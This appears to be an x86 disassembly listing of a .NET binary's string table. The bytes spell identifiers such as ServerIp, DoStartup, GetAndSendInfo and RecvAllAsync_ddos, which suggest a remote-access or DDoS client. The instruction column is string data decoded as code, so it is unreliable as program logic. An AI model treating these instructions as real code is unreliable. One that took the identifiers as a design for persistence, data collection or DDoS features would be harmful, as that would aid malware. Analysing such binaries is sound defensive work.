  40a4a0:	61                   	popa
  40a4a1:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a4a4:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a4a6:	74 4f                	je     0x40a4f7
  40a4a8:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a4ab:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40a4af:	6c                   	insb   (%dx),%es:(%edi)
  40a4b0:	6c                   	insb   (%dx),%es:(%edi)
  40a4b1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a4b6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4b7:	00 4b 65             	add    %cl,0x65(%ebx)
  40a4ba:	79 43                	jns    0x40a4ff
  40a4bc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4bd:	6c                   	insb   (%dx),%es:(%edi)
  40a4be:	6c                   	insb   (%dx),%es:(%edi)
  40a4bf:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a4c4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4c5:	00 61 64             	add    %ah,0x64(%ecx)
  40a4c8:	64 5f                	fs pop %edi
  40a4ca:	55                   	push   %ebp
  40a4cb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4cc:	68 61 6e 64 6c       	push   $0x6c646e61
  40a4d1:	65 64 45             	gs fs inc %ebp
  40a4d4:	78 63                	js     0x40a539
  40a4d6:	65 70 74             	gs jo  0x40a54d
  40a4d9:	69 6f 6e 00 43 75 72 	imul   $0x72754300,0x6e(%edi),%ebp
  40a4e0:	72 65                	jb     0x40a547
  40a4e2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4e3:	74 44                	je     0x40a529
  40a4e5:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4e6:	6d                   	insl   (%dx),%es:(%edi)
  40a4e7:	61                   	popa
  40a4e8:	69 6e 5f 55 6e 68 61 	imul   $0x61686e55,0x5f(%esi),%ebp
  40a4ef:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4f0:	64 6c                	fs insb (%dx),%es:(%edi)
  40a4f2:	65 64 45             	gs fs inc %ebp
  40a4f5:	78 63                	js     0x40a55a
  40a4f7:	65 70 74             	gs jo  0x40a56e
  40a4fa:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  40a501:	75 6d                	jne    0x40a570
  40a503:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a505:	74 4e                	je     0x40a555
  40a507:	75 6c                	jne    0x40a575
  40a509:	6c                   	insb   (%dx),%es:(%edi)
  40a50a:	45                   	inc    %ebp
  40a50b:	78 63                	js     0x40a570
  40a50d:	65 70 74             	gs jo  0x40a584
  40a510:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  40a517:	45                   	inc    %ebp
  40a518:	78 63                	js     0x40a57d
  40a51a:	65 70 74             	gs jo  0x40a591
  40a51d:	69 6f 6e 00 45 6e 63 	imul   $0x636e4500,0x6e(%edi),%ebp
  40a524:	72 79                	jb     0x40a59f
  40a526:	70 74                	jo     0x40a59c
  40a528:	69 6f 6e 00 52 75 6e 	imul   $0x6e755200,0x6e(%edi),%ebp
  40a52f:	00 55 6e             	add    %dl,0x6e(%ebp)
  40a532:	6b 6e 6f 77          	imul   $0x77,0x6f(%esi),%ebp
  40a536:	6e                   	outsb  %ds:(%esi),(%dx)
  40a537:	00 47 65             	add    %al,0x65(%edi)
  40a53a:	74 41                	je     0x40a57d
  40a53c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a53d:	64 53                	fs push %ebx
  40a53f:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a541:	64 49                	fs dec %ecx
  40a543:	6e                   	outsb  %ds:(%esi),(%dx)
  40a544:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a546:	00 4d 65             	add    %cl,0x65(%ebp)
  40a549:	74 68                	je     0x40a5b3
  40a54b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a54c:	64 49                	fs dec %ecx
  40a54e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a54f:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a551:	00 53 65             	add    %dl,0x65(%ebx)
  40a554:	6e                   	outsb  %ds:(%esi),(%dx)
  40a555:	64 55                	fs push %ebp
  40a557:	70 64                	jo     0x40a5bd
  40a559:	61                   	popa
  40a55a:	74 65                	je     0x40a5c1
  40a55c:	49                   	dec    %ecx
  40a55d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a55e:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a560:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  40a564:	76 65                	jbe    0x40a5cb
  40a566:	49                   	dec    %ecx
  40a567:	6e                   	outsb  %ds:(%esi),(%dx)
  40a568:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a56a:	00 67 65             	add    %ah,0x65(%edi)
  40a56d:	74 5f                	je     0x40a5ce
  40a56f:	53                   	push   %ebx
  40a570:	74 61                	je     0x40a5d3
  40a572:	72 74                	jb     0x40a5e8
  40a574:	49                   	dec    %ecx
  40a575:	6e                   	outsb  %ds:(%esi),(%dx)
  40a576:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a578:	00 50 72             	add    %dl,0x72(%eax)
  40a57b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a57c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a57f:	73 53                	jae    0x40a5d4
  40a581:	74 61                	je     0x40a5e4
  40a583:	72 74                	jb     0x40a5f9
  40a585:	49                   	dec    %ecx
  40a586:	6e                   	outsb  %ds:(%esi),(%dx)
  40a587:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a589:	00 47 65             	add    %al,0x65(%edi)
  40a58c:	74 4c                	je     0x40a5da
  40a58e:	61                   	popa
  40a58f:	73 74                	jae    0x40a605
  40a591:	49                   	dec    %ecx
  40a592:	6e                   	outsb  %ds:(%esi),(%dx)
  40a593:	70 75                	jo     0x40a60a
  40a595:	74 49                	je     0x40a5e0
  40a597:	6e                   	outsb  %ds:(%esi),(%dx)
  40a598:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a59a:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  40a59e:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40a5a3:	79 49                	jns    0x40a5ee
  40a5a5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5a6:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a5a8:	00 53 65             	add    %dl,0x65(%ebx)
  40a5ab:	72 76                	jb     0x40a623
  40a5ad:	65 72 49             	gs jb  0x40a5f9
  40a5b0:	70 00                	jo     0x40a5b2
  40a5b2:	53                   	push   %ebx
  40a5b3:	6c                   	insb   (%dx),%es:(%edi)
  40a5b4:	65 65 70 00          	gs gs jo 0x40a5b8
  40a5b8:	53                   	push   %ebx
  40a5b9:	6b 69 70 00          	imul   $0x0,0x70(%ecx),%ebp
  40a5bd:	6d                   	insl   (%dx),%es:(%edi)
  40a5be:	65 6d                	gs insl (%dx),%es:(%edi)
  40a5c0:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  40a5c3:	00 52 65             	add    %dl,0x65(%edx)
  40a5c6:	6d                   	insl   (%dx),%es:(%edi)
  40a5c7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5c8:	76 65                	jbe    0x40a62f
  40a5ca:	53                   	push   %ebx
  40a5cb:	74 61                	je     0x40a62e
  40a5cd:	72 74                	jb     0x40a643
  40a5cf:	75 70                	jne    0x40a641
  40a5d1:	00 44 6f 53          	add    %al,0x53(%edi,%ebp,2)
  40a5d5:	74 61                	je     0x40a638
  40a5d7:	72 74                	jb     0x40a64d
  40a5d9:	75 70                	jne    0x40a64b
  40a5db:	00 53 79             	add    %dl,0x79(%ebx)
  40a5de:	73 74                	jae    0x40a654
  40a5e0:	65 6d                	gs insl (%dx),%es:(%edi)
  40a5e2:	2e 4c                	cs dec %esp
  40a5e4:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  40a5eb:	61                   	popa
  40a5ec:	72 00                	jb     0x40a5ee
  40a5ee:	43                   	inc    %ebx
  40a5ef:	68 61 72 00 50       	push   $0x50007261
  40a5f4:	61                   	popa
  40a5f5:	72 73                	jb     0x40a66a
  40a5f7:	65 48                	gs dec %eax
  40a5f9:	65 61                	gs popa
  40a5fb:	64 65 72 00          	fs gs jb 0x40a5ff
  40a5ff:	53                   	push   %ebx
  40a600:	74 72                	je     0x40a674
  40a602:	65 61                	gs popa
  40a604:	6d                   	insl   (%dx),%es:(%edi)
  40a605:	52                   	push   %edx
  40a606:	65 61                	gs popa
  40a608:	64 65 72 00          	fs gs jb 0x40a60c
  40a60c:	54                   	push   %esp
  40a60d:	65 78 74             	gs js  0x40a684
  40a610:	52                   	push   %edx
  40a611:	65 61                	gs popa
  40a613:	64 65 72 00          	fs gs jb 0x40a617
  40a617:	68 65 61 64 65       	push   $0x65646165
  40a61c:	72 00                	jb     0x40a61e
  40a61e:	4d                   	dec    %ebp
  40a61f:	44                   	inc    %esp
  40a620:	35 43 72 79 70       	xor    $0x70797243,%eax
  40a625:	74 6f                	je     0x40a696
  40a627:	53                   	push   %ebx
  40a628:	65 72 76             	gs jb  0x40a6a1
  40a62b:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40a632:	69 64 65 72 00 41 73 	imul   $0x79734100,0x72(%ebp,%eiz,2),%esp
  40a639:	79 
  40a63a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a63b:	63 56 6f             	arpl   %edx,0x6f(%esi)
  40a63e:	69 64 4d 65 74 68 6f 	imul   $0x646f6874,0x65(%ebp,%ecx,2),%esp
  40a645:	64 
  40a646:	42                   	inc    %edx
  40a647:	75 69                	jne    0x40a6b2
  40a649:	6c                   	insb   (%dx),%es:(%edi)
  40a64a:	64 65 72 00          	fs gs jb 0x40a64e
  40a64e:	41                   	inc    %ecx
  40a64f:	73 79                	jae    0x40a6ca
  40a651:	6e                   	outsb  %ds:(%esi),(%dx)
  40a652:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  40a656:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  40a65a:	68 6f 64 42 75       	push   $0x7542646f
  40a65f:	69 6c 64 65 72 00 53 	imul   $0x74530072,0x65(%esp,%eiz,2),%ebp
  40a666:	74 
  40a667:	72 69                	jb     0x40a6d2
  40a669:	6e                   	outsb  %ds:(%esi),(%dx)
  40a66a:	67 42                	addr16 inc %edx
  40a66c:	75 69                	jne    0x40a6d7
  40a66e:	6c                   	insb   (%dx),%es:(%edi)
  40a66f:	64 65 72 00          	fs gs jb 0x40a673
  40a673:	3c 3e                	cmp    $0x3e,%al
  40a675:	74 5f                	je     0x40a6d6
  40a677:	5f                   	pop    %edi
  40a678:	62 75 69             	bound  %esi,0x69(%ebp)
  40a67b:	6c                   	insb   (%dx),%es:(%edi)
  40a67c:	64 65 72 00          	fs gs jb 0x40a680
  40a680:	73 65                	jae    0x40a6e7
  40a682:	6e                   	outsb  %ds:(%esi),(%dx)
  40a683:	64 65 72 00          	fs gs jb 0x40a687
  40a687:	52                   	push   %edx
  40a688:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40a68c:	6c                   	insb   (%dx),%es:(%edi)
  40a68d:	6c                   	insb   (%dx),%es:(%edi)
  40a68e:	41                   	inc    %ecx
  40a68f:	73 79                	jae    0x40a70a
  40a691:	6e                   	outsb  %ds:(%esi),(%dx)
  40a692:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40a695:	64 6f                	outsl  %fs:(%esi),(%dx)
  40a697:	73 5f                	jae    0x40a6f8
  40a699:	73 61                	jae    0x40a6fc
  40a69b:	66 65 72 00          	data16 gs jb 0x40a69f
  40a69f:	52                   	push   %edx
  40a6a0:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  40a6a4:	6c                   	insb   (%dx),%es:(%edi)
  40a6a5:	6c                   	insb   (%dx),%es:(%edi)
  40a6a6:	41                   	inc    %ecx
  40a6a7:	73 79                	jae    0x40a722
  40a6a9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6aa:	63 5f 64             	arpl   %ebx,0x64(%edi)
  40a6ad:	64 6f                	outsl  %fs:(%esi),(%dx)
  40a6af:	73 5f                	jae    0x40a710
  40a6b1:	75 6e                	jne    0x40a721
  40a6b3:	73 61                	jae    0x40a716
  40a6b5:	66 65 72 00          	data16 gs jb 0x40a6b9
  40a6b9:	43                   	inc    %ebx
  40a6ba:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6bb:	6d                   	insl   (%dx),%es:(%edi)
  40a6bc:	70 72                	jo     0x40a730
  40a6be:	65 73 73             	gs jae 0x40a734
  40a6c1:	65 64 42             	gs fs inc %edx
  40a6c4:	75 66                	jne    0x40a72c
  40a6c6:	66 65 72 00          	data16 gs jb 0x40a6ca
  40a6ca:	55                   	push   %ebp
  40a6cb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6cc:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  40a6cf:	70 72                	jo     0x40a743
  40a6d1:	65 73 73             	gs jae 0x40a747
  40a6d4:	65 64 42             	gs fs inc %edx
  40a6d7:	75 66                	jne    0x40a73f
  40a6d9:	66 65 72 00          	data16 gs jb 0x40a6dd
  40a6dd:	57                   	push   %edi
  40a6de:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6df:	72 6b                	jb     0x40a74c
  40a6e1:	73 70                	jae    0x40a753
  40a6e3:	61                   	popa
  40a6e4:	63 65 42             	arpl   %esp,0x42(%ebp)
  40a6e7:	75 66                	jne    0x40a74f
  40a6e9:	66 65 72 00          	data16 gs jb 0x40a6ed
  40a6ed:	53                   	push   %ebx
  40a6ee:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6ef:	75 72                	jne    0x40a763
  40a6f1:	63 65 42             	arpl   %esp,0x42(%ebp)
  40a6f4:	75 66                	jne    0x40a75c
  40a6f6:	66 65 72 00          	data16 gs jb 0x40a6fa
  40a6fa:	44                   	inc    %esp
  40a6fb:	65 73 74             	gs jae 0x40a772
  40a6fe:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  40a705:	42                   	inc    %edx
  40a706:	75 66                	jne    0x40a76e
  40a708:	66 65 72 00          	data16 gs jb 0x40a70c
  40a70c:	52                   	push   %edx
  40a70d:	74 6c                	je     0x40a77b
  40a70f:	43                   	inc    %ebx
  40a710:	6f                   	outsl  %ds:(%esi),(%dx)
  40a711:	6d                   	insl   (%dx),%es:(%edi)
  40a712:	70 72                	jo     0x40a786
  40a714:	65 73 73             	gs jae 0x40a78a
  40a717:	42                   	inc    %edx
  40a718:	75 66                	jne    0x40a780
  40a71a:	66 65 72 00          	data16 gs jb 0x40a71e
  40a71e:	52                   	push   %edx
  40a71f:	74 6c                	je     0x40a78d
  40a721:	44                   	inc    %esp
  40a722:	65 63 6f 6d          	arpl   %ebp,%gs:0x6d(%edi)
  40a726:	70 72                	jo     0x40a79a
  40a728:	65 73 73             	gs jae 0x40a79e
  40a72b:	42                   	inc    %edx
  40a72c:	75 66                	jne    0x40a794
  40a72e:	66 65 72 00          	data16 gs jb 0x40a732
  40a732:	62 75 66             	bound  %esi,0x66(%ebp)
  40a735:	66 65 72 00          	data16 gs jb 0x40a739
  40a739:	4d                   	dec    %ebp
  40a73a:	61                   	popa
  40a73b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a73c:	61                   	popa
  40a73d:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a740:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a742:	74 4f                	je     0x40a793
  40a744:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a747:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40a74b:	61                   	popa
  40a74c:	72 63                	jb     0x40a7b1
  40a74e:	68 65 72 00 44       	push   $0x44007265
  40a753:	6c                   	insb   (%dx),%es:(%edi)
  40a754:	6c                   	insb   (%dx),%es:(%edi)
  40a755:	4e                   	dec    %esi
  40a756:	6f                   	outsl  %ds:(%esi),(%dx)
  40a757:	64 65 48             	fs gs dec %eax
  40a75a:	61                   	popa
  40a75b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a75c:	64 6c                	fs insb (%dx),%es:(%edi)
  40a75e:	65 72 00             	gs jb  0x40a761
  40a761:	44                   	inc    %esp
  40a762:	6c                   	insb   (%dx),%es:(%edi)
  40a763:	6c                   	insb   (%dx),%es:(%edi)
  40a764:	48                   	dec    %eax
  40a765:	61                   	popa
  40a766:	6e                   	outsb  %ds:(%esi),(%dx)
  40a767:	64 6c                	fs insb (%dx),%es:(%edi)
  40a769:	65 72 00             	gs jb  0x40a76c
  40a76c:	53                   	push   %ebx
  40a76d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a76e:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a771:	74 48                	je     0x40a7bb
  40a773:	61                   	popa
  40a774:	6e                   	outsb  %ds:(%esi),(%dx)
  40a775:	64 6c                	fs insb (%dx),%es:(%edi)
  40a777:	65 72 00             	gs jb  0x40a77a
  40a77a:	52                   	push   %edx
  40a77b:	65 73 6f             	gs jae 0x40a7ed
  40a77e:	6c                   	insb   (%dx),%es:(%edi)
  40a77f:	76 65                	jbe    0x40a7e6
  40a781:	45                   	inc    %ebp
  40a782:	76 65                	jbe    0x40a7e9
  40a784:	6e                   	outsb  %ds:(%esi),(%dx)
  40a785:	74 48                	je     0x40a7cf
  40a787:	61                   	popa
  40a788:	6e                   	outsb  %ds:(%esi),(%dx)
  40a789:	64 6c                	fs insb (%dx),%es:(%edi)
  40a78b:	65 72 00             	gs jb  0x40a78e
  40a78e:	55                   	push   %ebp
  40a78f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a790:	68 61 6e 64 6c       	push   $0x6c646e61
  40a795:	65 64 45             	gs fs inc %ebp
  40a798:	78 63                	js     0x40a7fd
  40a79a:	65 70 74             	gs jo  0x40a811
  40a79d:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  40a7a4:	74 48                	je     0x40a7ee
  40a7a6:	61                   	popa
  40a7a7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7a8:	64 6c                	fs insb (%dx),%es:(%edi)
  40a7aa:	65 72 00             	gs jb  0x40a7ad
  40a7ad:	5f                   	pop    %edi
  40a7ae:	64 6c                	fs insb (%dx),%es:(%edi)
  40a7b0:	6c                   	insb   (%dx),%es:(%edi)
  40a7b1:	68 61 6e 64 6c       	push   $0x6c646e61
  40a7b6:	65 72 00             	gs jb  0x40a7b9
  40a7b9:	54                   	push   %esp
  40a7ba:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7bb:	55                   	push   %ebp
  40a7bc:	70 70                	jo     0x40a82e
  40a7be:	65 72 00             	gs jb  0x40a7c1
  40a7c1:	54                   	push   %esp
  40a7c2:	61                   	popa
  40a7c3:	73 6b                	jae    0x40a830
  40a7c5:	41                   	inc    %ecx
  40a7c6:	77 61                	ja     0x40a829
  40a7c8:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  40a7cf:	74 
  40a7d0:	41                   	inc    %ecx
  40a7d1:	77 61                	ja     0x40a834
  40a7d3:	69 74 65 72 00 43 61 	imul   $0x70614300,0x72(%ebp,%eiz,2),%esi
  40a7da:	70 
  40a7db:	74 75                	je     0x40a852
  40a7dd:	72 69                	jb     0x40a848
  40a7df:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7e0:	67 43                	addr16 inc %ebx
  40a7e2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7e3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7e4:	73 6f                	jae    0x40a855
  40a7e6:	6c                   	insb   (%dx),%es:(%edi)
  40a7e7:	65 57                	gs push %edi
  40a7e9:	72 69                	jb     0x40a854
  40a7eb:	74 65                	je     0x40a852
  40a7ed:	72 00                	jb     0x40a7ef
  40a7ef:	54                   	push   %esp
  40a7f0:	65 78 74             	gs js  0x40a867
  40a7f3:	57                   	push   %edi
  40a7f4:	72 69                	jb     0x40a85f
  40a7f6:	74 65                	je     0x40a85d
  40a7f8:	72 00                	jb     0x40a7fa
  40a7fa:	42                   	inc    %edx
  40a7fb:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40a802:	72 
  40a803:	74 65                	je     0x40a86a
  40a805:	72 00                	jb     0x40a807
  40a807:	73 75                	jae    0x40a87e
  40a809:	62 53 65             	bound  %edx,0x65(%ebx)
  40a80c:	72 76                	jb     0x40a884
  40a80e:	65 72 00             	gs jb  0x40a811
  40a811:	4d                   	dec    %ebp
  40a812:	61                   	popa
  40a813:	6e                   	outsb  %ds:(%esi),(%dx)
  40a814:	61                   	popa
  40a815:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a818:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a81a:	74 4f                	je     0x40a86b
  40a81c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a81f:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  40a823:	75 6d                	jne    0x40a892
  40a825:	65 72 61             	gs jb  0x40a889
  40a828:	74 6f                	je     0x40a899
  40a82a:	72 00                	jb     0x40a82c
  40a82c:	47                   	inc    %edi
  40a82d:	65 74 45             	gs je  0x40a875
  40a830:	6e                   	outsb  %ds:(%esi),(%dx)
  40a831:	75 6d                	jne    0x40a8a0
  40a833:	65 72 61             	gs jb  0x40a897
  40a836:	74 6f                	je     0x40a8a7
  40a838:	72 00                	jb     0x40a83a
  40a83a:	41                   	inc    %ecx
  40a83b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40a83f:	61                   	popa
  40a840:	74 6f                	je     0x40a8b1
  40a842:	72 00                	jb     0x40a844
  40a844:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40a849:	00 2e                	add    %ch,(%esi)
  40a84b:	63 63 74             	arpl   %esp,0x74(%ebx)
  40a84e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a84f:	72 00                	jb     0x40a851
  40a851:	43                   	inc    %ebx
  40a852:	72 65                	jb     0x40a8b9
  40a854:	61                   	popa
  40a855:	74 65                	je     0x40a8bc
  40a857:	44                   	inc    %esp
  40a858:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40a85c:	70 74                	jo     0x40a8d2
  40a85e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a85f:	72 00                	jb     0x40a861
  40a861:	43                   	inc    %ebx
  40a862:	72 65                	jb     0x40a8c9
  40a864:	61                   	popa
  40a865:	74 65                	je     0x40a8cc
  40a867:	45                   	inc    %ebp
  40a868:	6e                   	outsb  %ds:(%esi),(%dx)
  40a869:	63 72 79             	arpl   %esi,0x79(%edx)
  40a86c:	70 74                	jo     0x40a8e2
  40a86e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a86f:	72 00                	jb     0x40a871
  40a871:	49                   	dec    %ecx
  40a872:	6e                   	outsb  %ds:(%esi),(%dx)
  40a873:	74 50                	je     0x40a8c5
  40a875:	74 72                	je     0x40a8e9
  40a877:	00 53 79             	add    %dl,0x79(%ebx)
  40a87a:	73 74                	jae    0x40a8f0
  40a87c:	65 6d                	gs insl (%dx),%es:(%edi)
  40a87e:	2e 44                	cs inc %esp
  40a880:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40a887:	69 63 73 00 67 65 74 	imul   $0x74656700,0x73(%ebx),%esp
  40a88e:	5f                   	pop    %edi
  40a88f:	54                   	push   %esp
  40a890:	6f                   	outsl  %ds:(%esi),(%dx)
  40a891:	74 61                	je     0x40a8f4
  40a893:	6c                   	insb   (%dx),%es:(%edi)
  40a894:	4d                   	dec    %ebp
  40a895:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  40a89c:	6f 
  40a89d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a89e:	64 73 00             	fs jae 0x40a8a1
  40a8a1:	41                   	inc    %ecx
  40a8a2:	65 73 00             	gs jae 0x40a8a5
  40a8a5:	53                   	push   %ebx
  40a8a6:	79 73                	jns    0x40a91b
  40a8a8:	74 65                	je     0x40a90f
  40a8aa:	6d                   	insl   (%dx),%es:(%edi)
  40a8ab:	2e 52                	cs push %edx
  40a8ad:	75 6e                	jne    0x40a91d
  40a8af:	74 69                	je     0x40a91a
  40a8b1:	6d                   	insl   (%dx),%es:(%edi)
  40a8b2:	65 2e 49             	gs cs dec %ecx
  40a8b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8b6:	74 65                	je     0x40a91d
  40a8b8:	72 6f                	jb     0x40a929
  40a8ba:	70 53                	jo     0x40a90f
  40a8bc:	65 72 76             	gs jb  0x40a935
  40a8bf:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40a8c6:	73 74                	jae    0x40a93c
  40a8c8:	65 6d                	gs insl (%dx),%es:(%edi)
  40a8ca:	2e 52                	cs push %edx
  40a8cc:	75 6e                	jne    0x40a93c
  40a8ce:	74 69                	je     0x40a939
  40a8d0:	6d                   	insl   (%dx),%es:(%edi)
  40a8d1:	65 2e 43             	gs cs inc %ebx
  40a8d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8d5:	6d                   	insl   (%dx),%es:(%edi)
  40a8d6:	70 69                	jo     0x40a941
  40a8d8:	6c                   	insb   (%dx),%es:(%edi)
  40a8d9:	65 72 53             	gs jb  0x40a92f
  40a8dc:	65 72 76             	gs jb  0x40a955
  40a8df:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40a8e6:	62 75 67             	bound  %esi,0x67(%ebp)
  40a8e9:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  40a8f0:	65 
  40a8f1:	73 00                	jae    0x40a8f3
  40a8f3:	73 75                	jae    0x40a96a
  40a8f5:	62 4e 6f             	bound  %ecx,0x6f(%esi)
  40a8f8:	64 65 73 00          	fs gs jae 0x40a8fc
  40a8fc:	41                   	inc    %ecx
  40a8fd:	73 73                	jae    0x40a972
  40a8ff:	65 6d                	gs insl (%dx),%es:(%edi)
  40a901:	62 6c 69 65          	bound  %ebp,0x65(%ecx,%ebp,2)
  40a905:	73 00                	jae    0x40a907
  40a907:	45                   	inc    %ebp
  40a908:	78 70                	js     0x40a97a
  40a90a:	61                   	popa
  40a90b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a90c:	64 45                	fs inc %ebp
  40a90e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a90f:	76 69                	jbe    0x40a97a
  40a911:	72 6f                	jb     0x40a982
  40a913:	6e                   	outsb  %ds:(%esi),(%dx)
  40a914:	6d                   	insl   (%dx),%es:(%edi)
  40a915:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a917:	74 56                	je     0x40a96f
  40a919:	61                   	popa
  40a91a:	72 69                	jb     0x40a985
  40a91c:	61                   	popa
  40a91d:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  40a921:	00 47 65             	add    %al,0x65(%edi)
  40a924:	74 56                	je     0x40a97c
  40a926:	61                   	popa
  40a927:	6c                   	insb   (%dx),%es:(%edi)
  40a928:	75 65                	jne    0x40a98f
  40a92a:	4e                   	dec    %esi
  40a92b:	61                   	popa
  40a92c:	6d                   	insl   (%dx),%es:(%edi)
  40a92d:	65 73 00             	gs jae 0x40a930
  40a930:	49                   	dec    %ecx
  40a931:	6e                   	outsb  %ds:(%esi),(%dx)
  40a932:	74 54                	je     0x40a988
  40a934:	6f                   	outsl  %ds:(%esi),(%dx)
  40a935:	42                   	inc    %edx
  40a936:	79 74                	jns    0x40a9ac
  40a938:	65 73 00             	gs jae 0x40a93b
  40a93b:	47                   	inc    %edi
  40a93c:	65 74 42             	gs je  0x40a981
  40a93f:	79 74                	jns    0x40a9b5
  40a941:	65 73 00             	gs jae 0x40a944
  40a944:	73 69                	jae    0x40a9af
  40a946:	7a 65                	jp     0x40a9ad
  40a948:	74 64                	je     0x40a9ae
  40a94a:	77 42                	ja     0x40a98e
  40a94c:	79 74                	jns    0x40a9c2
  40a94e:	65 73 00             	gs jae 0x40a951
  40a951:	62 79 74             	bound  %edi,0x74(%ecx)
  40a954:	65 73 00             	gs jae 0x40a957
  40a957:	42                   	inc    %edx
  40a958:	69 6e 64 69 6e 67 46 	imul   $0x46676e69,0x64(%esi),%ebp
  40a95f:	6c                   	insb   (%dx),%es:(%edi)
  40a960:	61                   	popa
  40a961:	67 73 00             	addr16 jae 0x40a964
  40a964:	53                   	push   %ebx
  40a965:	6f                   	outsl  %ds:(%esi),(%dx)
  40a966:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40a969:	74 46                	je     0x40a9b1
  40a96b:	6c                   	insb   (%dx),%es:(%edi)
  40a96c:	61                   	popa
  40a96d:	67 73 00             	addr16 jae 0x40a970
  40a970:	75 46                	jne    0x40a9b8
  40a972:	6c                   	insb   (%dx),%es:(%edi)
  40a973:	61                   	popa
  40a974:	67 73 00             	addr16 jae 0x40a977
  40a977:	52                   	push   %edx
  40a978:	65 73 6f             	gs jae 0x40a9ea
  40a97b:	6c                   	insb   (%dx),%es:(%edi)
  40a97c:	76 65                	jbe    0x40a9e3
  40a97e:	45                   	inc    %ebp
  40a97f:	76 65                	jbe    0x40a9e6
  40a981:	6e                   	outsb  %ds:(%esi),(%dx)
